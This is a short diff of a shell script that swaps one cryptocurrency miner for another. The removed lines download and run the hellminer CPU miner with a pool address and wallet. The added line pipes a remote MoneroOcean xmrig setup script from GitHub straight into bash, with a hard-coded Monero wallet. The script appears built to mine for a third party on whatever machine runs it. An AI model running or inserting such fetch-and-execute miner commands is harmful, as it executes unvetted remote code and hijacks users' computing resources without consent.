@@ -1,6 +1,2 @@
 #!/bin/sh
-sudo su
-sudo apt install screen -y
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-tar xf hellminer_cpu_linux.tar.gz
-./hellminer -c stratum+tcp://ap.luckpool.net: 3956#xnsub -u RKdUbV5nAqA6ZaCsKNTgC945WA9nH4s05L.workename -p --cpu 4
+curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 87ZnXaekGx6DTYpL3rEYRDMGdGeqh5A7U9GezzvHRSji3Mf6fLCuk1gBhkDWaQVTFgbecKCB9swWK6BXFxDtxGcLG51mP7G
